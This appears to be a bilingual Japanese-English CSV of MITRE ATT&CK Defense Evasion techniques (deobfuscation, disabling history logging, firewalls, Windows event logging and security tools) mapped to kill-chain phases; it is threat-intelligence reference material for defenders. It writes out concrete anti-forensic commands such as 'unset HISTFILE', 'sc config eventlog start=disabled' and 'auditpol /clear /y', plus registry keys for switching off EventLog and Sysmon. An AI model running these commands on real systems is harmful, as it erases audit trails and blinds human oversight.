Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1140,ファイルまたは情報の難読化解除/デコード,Deobfuscate/Decode Files or Information,"攻撃者は、[難読化されたファイルまたは情報](https://attack.mitre.org/techniques/T1027)を使用して、侵入のアーティファクトを分析から隠す可能性があります。それらをどのように使用するかに応じて、その情報をデコードまたは難読化解除するための個別のメカニズムが必要になる場合があります。そのための方法には、マルウェアの組み込み機能や、システムに存在するユーティリティの使用が含まれます。

そのような例の1つは、証明書ファイル内に隠されているリモートアクセスツールポータブル実行可能ファイルをデコードするために[certutil](https://attack.mitre.org/software/S0160)を使用することです。(引用: Malwarebytes Targeted Attack against Saudi Arabia) 別の例は、Windowsの<code>copy /b</code>または<code>type</code>コマンドを使用してバイナリフラグメントを悪意のあるペイロードに再構築することです。(引用: Carbon Black Obfuscation Sept 2016)(引用: Sentinel One Tainted Love 2023)

場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)の一環として難読化解除または復号化のためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016)","Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.

One such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> or <code>type</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)(Citation: Sentinel One Tainted Love 2023)

Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.(Citation: Volexity PowerDuke November 2016)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1562,防御の阻害,Impair Defenses,"攻撃者は、防御メカニズムを妨害または無効にするために、被害者環境のコンポーネントを悪意を持って変更する可能性があります。これには、ファイアウォールやウイルス対策などの予防的防御を損なうだけでなく、防御側がアクティビティを監査し悪意のある行動を特定するために使用できる検出機能も含まれます。これはまた、ネイティブの防御と、ユーザーや管理者によってインストールされた補足機能の両方に及ぶ可能性があります。

攻撃者はまた、ユーザーのログアウトをブロックしたり、システムのシャットダウンを妨げたり、更新プロセスを無効化または変更したりするなど、防御的な衛生状態に寄与する日常業務を損なう可能性があります。攻撃者はまた、イベント集約および分析メカニズムを標的にしたり、他のシステムコンポーネントを変更することによってこれらの手順を混乱させたりする可能性もあります。これらの制限により、悪意のある操作やインシデントの継続的な伝播がさらに可能になる可能性があります。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)","Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",T1562.003,コマンド履歴ログの阻害,Impair Command History Logging,"攻撃者は、侵害されたシステムで実行したコマンドを隠すために、コマンド履歴のログ記録を妨害する可能性があります。さまざまなコマンドインタプリタは、ユーザーが端末に入力したコマンドを追跡し、ユーザーが実行した内容を遡れるようにします。

LinuxおよびmacOSでは、コマンド履歴は環境変数<code>HISTFILE</code>が指すファイルに記録されます。ユーザーがシステムからログオフすると、この情報はユーザーのホームディレクトリにある<code>~/.bash_history</code>というファイルに書き込まれます。<code>HISTCONTROL</code>環境変数は、<code>history</code>コマンドによって保存され、ユーザーがログオフしたときに最終的に<code>~/.bash_history</code>ファイルに書き込まれるべき内容を追跡します。<code>HISTCONTROL</code>はmacOSにはデフォルトでは存在しませんが、ユーザーが設定でき、尊重されます。<code>HISTFILE</code>環境変数は、一部のESXiシステムでも使用されます。(引用: Google Cloud Threat Intelligence ESXi VIBs 2022)

攻撃者は、履歴環境変数をクリアしたり（<code>unset HISTFILE</code>）、コマンド履歴サイズをゼロに設定したり（<code>export HISTFILESIZE=0</code>）して、コマンドのログ記録を防ぐ可能性があります。さらに、<code>HISTCONTROL</code>は、単に「ignorespace」に設定することで、スペースで始まるコマンドを無視するように構成できます。<code>HISTCONTROL</code>はまた、「ignoredups」に設定することで重複するコマンドを無視するように設定することもできます。一部のLinuxシステムでは、これはデフォルトで「ignoreboth」に設定されており、これは前の両方の例をカバーしています。つまり、「 ls」は保存されませんが、「ls」は履歴によって保存されます。攻撃者はこれを悪用して、端末コマンドのすべてにスペースを先頭に追加するだけで痕跡を残さずに操作できます。

Windowsシステムでは、<code>PSReadLine</code>モジュールがすべてのPowerShellセッションで使用されたコマンドを追跡し、ファイル（デフォルトでは<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code>）に書き込みます。攻撃者は、<code>Set-PSReadLineOption -HistorySavePath {ファイルパス}</code>を使用してこれらのログの保存場所を変更する可能性があります。これにより、<code>ConsoleHost_history.txt</code>はログの受信を停止します。さらに、PowerShellコマンド<code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>を使用してこのファイルへのログ記録をオフにすることも可能です。(引用: Microsoft PowerShell Command History)(引用: Sophos PowerShell command audit)(引用: Sophos PowerShell Command History Forensics)

攻撃者はまた、ネットワークデバイス上の[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)を利用して、過去のコマンドログを無効にする可能性があります（例: <code>no logging</code>）。","Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.

On Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected. The `HISTFILE` environment variable is also used in some ESXi systems.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)

Adversaries may clear the history environment variable (<code>unset HISTFILE</code>) or set the command history size to zero (<code>export HISTFILESIZE=0</code>) to prevent logging of commands. Additionally, <code>HISTCONTROL</code> can be configured to ignore commands that start with a space by simply setting it to \""ignorespace\"". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \""ignoredups\"". In some Linux systems, this is set by default to \""ignoreboth\"" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.

On Windows systems, the <code>PSReadLine</code> module tracks commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). Adversaries may change where these logs are saved using <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. This will cause <code>ConsoleHost_history.txt</code> to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)

Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. <code>no logging</code>).",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1562,防御の阻害,Impair Defenses,"攻撃者は、防御メカニズムを妨害または無効にするために、被害者環境のコンポーネントを悪意を持って変更する可能性があります。これには、ファイアウォールやウイルス対策などの予防的防御を損なうだけでなく、防御側がアクティビティを監査し悪意のある行動を特定するために使用できる検出機能も含まれます。これはまた、ネイティブの防御と、ユーザーや管理者によってインストールされた補足機能の両方に及ぶ可能性があります。

攻撃者はまた、ユーザーのログアウトをブロックしたり、システムのシャットダウンを妨げたり、更新プロセスを無効化または変更したりするなど、防御的な衛生状態に寄与する日常業務を損なう可能性があります。攻撃者はまた、イベント集約および分析メカニズムを標的にしたり、他のシステムコンポーネントを変更することによってこれらの手順を混乱させたりする可能性もあります。これらの制限により、悪意のある操作やインシデントの継続的な伝播がさらに可能になる可能性があります。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)","Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",T1562.004,システムファイアウォールの無効化または変更,Disable or Modify System Firewall,"攻撃者は、ネットワーク使用を制限する制御をバイパスするために、システムファイアウォールを無効化または変更する可能性があります。変更には、メカニズム全体の無効化や、特定のルールの追加、削除、変更が含まれる場合があります。これはオペレーティングシステムによってさまざまな方法で行うことができ、コマンドライン、Windowsレジストリキーの編集、Windowsコントロールパネルなどがあります。

システムファイアウォールを変更または無効にすると、他の方法では許可されない攻撃者のC2通信、横方向の移動、および/またはデータ持ち出しが可能になる場合があります。例えば、攻撃者は、従来とは異なり、潜在的にセキュリティが低いポート（つまり[非標準ポート](https://attack.mitre.org/techniques/T1571)）を使用して、よく知られたプロトコル（RDPなど）の新しいファイアウォールルールを追加する可能性があります。(引用: change_rdp_port_conti)

攻撃者はまた、インターフェース帯域幅やネットワーク接続要求のしきい値など、間接的にシステムファイアウォールを操作するホストネットワーク設定を変更する可能性があります。(引用: Huntress BlackCat) 様々な[リモートサービス](https://attack.mitre.org/techniques/T1021)の悪用を可能にする設定に関連する設定も、間接的にファイアウォールルールを変更する可能性があります。

ESXiでは、ファイアウォールルールはesxcliコマンドラインインターフェイス（例：<code>esxcli network firewall set</code>経由）またはvCenterユーザーインターフェイス経由で直接変更できます。(引用: Trellix Rnasomhouse 2024)(引用: Broadcom ESXi Firewall)","Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.

Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)

Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules.

In ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., via `esxcli network firewall set`) or via the vCenter user interface.(Citation: Trellix Rnasomhouse 2024)(Citation: Broadcom ESXi Firewall)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1562,防御の阻害,Impair Defenses,"攻撃者は、防御メカニズムを妨害または無効にするために、被害者環境のコンポーネントを悪意を持って変更する可能性があります。これには、ファイアウォールやウイルス対策などの予防的防御を損なうだけでなく、防御側がアクティビティを監査し悪意のある行動を特定するために使用できる検出機能も含まれます。これはまた、ネイティブの防御と、ユーザーや管理者によってインストールされた補足機能の両方に及ぶ可能性があります。

攻撃者はまた、ユーザーのログアウトをブロックしたり、システムのシャットダウンを妨げたり、更新プロセスを無効化または変更したりするなど、防御的な衛生状態に寄与する日常業務を損なう可能性があります。攻撃者はまた、イベント集約および分析メカニズムを標的にしたり、他のシステムコンポーネントを変更することによってこれらの手順を混乱させたりする可能性もあります。これらの制限により、悪意のある操作やインシデントの継続的な伝播がさらに可能になる可能性があります。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)","Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",T1562.002,Windowsイベントログの無効化,Disable Windows Event Logging,"攻撃者は、検出や監査に利用できるデータを制限するために、Windowsイベントログを無効にする可能性があります。Windowsイベントログは、ログイン試行、プロセス作成など、ユーザーやシステムのさまざまなアクティビティを記録します。(引用: Windows Log Events) このデータは、セキュリティツールやアナリストが検出を生成するために使用されます。

EventLogサービスは、さまざまなシステムコンポーネントやアプリケーションからのイベントログを管理します。(引用: EventLog_Core_Technologies) デフォルトでは、このサービスはシステムの起動時に自動的に開始されます。ローカルセキュリティポリシー（secpol.msc）によって管理される監査ポリシーは、EventLogサービスがログに記録するシステムイベントを定義します。セキュリティ監査ポリシー設定は、secpol.mscを実行し、基本的な監査ポリシー設定の場合は<code>セキュリティ設定\\ローカルポリシー\\監査ポリシー</code>に、高度な監査ポリシー設定の場合は<code>セキュリティ設定\\高度な監査ポリシー構成</code>に移動することで変更できます。(引用: Audit_Policy_Microsoft)(引用: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code>を使用して監査ポリシーを設定することもできます。(引用: auditpol)

敵対者は、システム全体のログ記録、または特定のアプリケーションのログ記録のみを標的にする可能性があります。例えば、Windows EventLogサービスは、<code>Set-Service -Name EventLog -Status Stopped</code>コマンドまたは<code>sc config eventlog start=disabled</code>コマンドを使用して無効にすることができます（その後、<code>Stop-Service  -Name EventLog</code>を使用してサービスを手動で停止します）。(引用: Disable_Win_Event_Logging)(引用: disable_win_evt_logging) さらに、このサービスは、<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code>の「Start」値を変更し、変更を有効にするためにシステムを再起動することで無効にすることができます。(引用: disable_win_evt_logging)

レジストリキーの変更によってEventLogサービスを無効にする方法はいくつかあります。まず、管理者権限なしで、敵対者はキー<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>の「Start」値を変更し、その後システムを再起動してセキュリティEventLogを無効にすることができます。(引用: winser19_file_overwrite_bug_twitter) 次に、管理者権限があれば、敵対者は<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code>と<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code>の同じ値を変更して、EventLog全体を無効にすることができます。(引用: disable_win_evt_logging)

さらに、敵対者はコマンドプロンプトで<code>auditpol</code>とそのサブコマンドを使用して、監査を無効にしたり、監査ポリシーをクリアしたりする可能性があります。指定された設定または監査カテゴリを有効または無効にするために、敵対者は<code>/success</code>または<code>/failure</code>パラメータを使用する可能性があります。例えば、<code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code>はアカウントログオンカテゴリの監査をオフにします。(引用: auditpol.exe_STRONTIC)(引用: T1562.002_redcanaryco) 監査ポリシーをクリアするために、敵対者は次の行を実行する可能性があります：<code>auditpol /clear /y</code>または<code>auditpol /remove /allusers</code>。(引用: T1562.002_redcanaryco)

Windowsイベントログを無効にすることで、攻撃者は侵害の証拠をあまり残さずに活動できます。","Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.

The EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)

Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the “Start” value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)

There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \""Start\"" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)

Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)

By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1562,防御の阻害,Impair Defenses,"攻撃者は、防御メカニズムを妨害または無効にするために、被害者環境のコンポーネントを悪意を持って変更する可能性があります。これには、ファイアウォールやウイルス対策などの予防的防御を損なうだけでなく、防御側がアクティビティを監査し悪意のある行動を特定するために使用できる検出機能も含まれます。これはまた、ネイティブの防御と、ユーザーや管理者によってインストールされた補足機能の両方に及ぶ可能性があります。

攻撃者はまた、ユーザーのログアウトをブロックしたり、システムのシャットダウンを妨げたり、更新プロセスを無効化または変更したりするなど、防御的な衛生状態に寄与する日常業務を損なう可能性があります。攻撃者はまた、イベント集約および分析メカニズムを標的にしたり、他のシステムコンポーネントを変更することによってこれらの手順を混乱させたりする可能性もあります。これらの制限により、悪意のある操作やインシデントの継続的な伝播がさらに可能になる可能性があります。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown)","Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",T1562.001,ツールの無効化または変更,Disable or Modify Tools,"攻撃者は、マルウェア/ツールやアクティビティの検出を回避するために、セキュリティツールを変更および/または無効にする可能性があります。これには、セキュリティソフトウェアのプロセスやサービスを強制終了したり、ツールが正しく動作しないようにレジストリキーや構成ファイルを変更/削除したり、セキュリティツールのスキャンや情報報告を妨害する他の方法など、さまざまな形態があります。攻撃者はまた、最新のセキュリティパッチが被害者システムのツールに到達するのを防ぐために更新を無効にする可能性もあります。(引用: SCADAfence_ransomware)

攻撃者はまた、セキュリティツールによって展開され利用されるアーティファクトを改ざんする可能性があります。セキュリティツールは、特定のイベントへの可視性を維持するために、システムコンポーネントに動的な変更を加えることがあります。例えば、セキュリティ製品は、データ収集を容易にするために独自のモジュールをロードしたり、プロセスによってロードされたモジュールを変更したりすることがあります。[インジケーターブロッキング](https://attack.mitre.org/techniques/T1562/006)と同様に、攻撃者は検出を回避するために、ツールによって追加されたこれらの機能（特にユーザーランドに存在する、または攻撃者がアクセスできる可能性のあるもの）をアンフックしたり、その他の方法で変更したりする可能性があります。(引用: OutFlank System Calls)(引用: MDSec System Calls) あるいは、エンドポイント検出応答（EDR）ツールの除外リストに新しいディレクトリを追加し、[ファイル/パスの除外](https://attack.mitre.org/techniques/T1564/012)を介して悪意のあるファイルを隠すことができるようにする可能性もあります。(引用: BlackBerry WhisperGate 2022)(引用: Google Cloud Threat Intelligence FIN13 2021)

敵対者はまた、Sysmonのような特定のアプリケーションに焦点を当てるかもしれません。例えば、<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code>の「Start」と「Enable」の値は、Sysmonのロギングを改ざんし、潜在的に無効にするために変更されるかもしれません。(引用：disable_win_evt_logging）

ネットワークデバイスでは、攻撃者は起動設定ファイルを変更することでデジタル署名検証チェックをスキップし、通常起動時に行われるファームウェア検証を効果的に無効にしようとする可能性があります。(引用：Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(引用：Analysis of FG-IR-22-369)

クラウド環境では、攻撃者によって無効にされたツールには、AWS CloudWatchやGoogle Cloud Monitorなどのサービスに報告するクラウド監視エージェントが含まれる場合があります。

さらに、防御ツールには改ざん防止メカニズムがあるかもしれませんが、攻撃者は正当なルートキット駆除キットなどのツールを悪用して、これらのツールを無効化および/または無効にする可能性があります。(引用: chasing_avaddon_ransomware)(引用: dharma_ransomware)(引用: demystifying_ryuk)(引用: doppelpaymer_crowdstrike) 例えば、攻撃者はGMERなどのツールを使用して、感染したシステム上の隠されたプロセスやウイルス対策ソフトウェアを見つけてシャットダウンしています。(引用: demystifying_ryuk)

さらに、攻撃者はウイルス対策ソフトウェアから正当なドライバを悪用してカーネル空間へのアクセスを取得する（つまり、[権限昇格のための悪用](https://attack.mitre.org/techniques/T1068)）可能性があり、これにより改ざん防止機能をバイパスする可能性があります。(引用: avoslocker_ransomware)","Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)

Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)

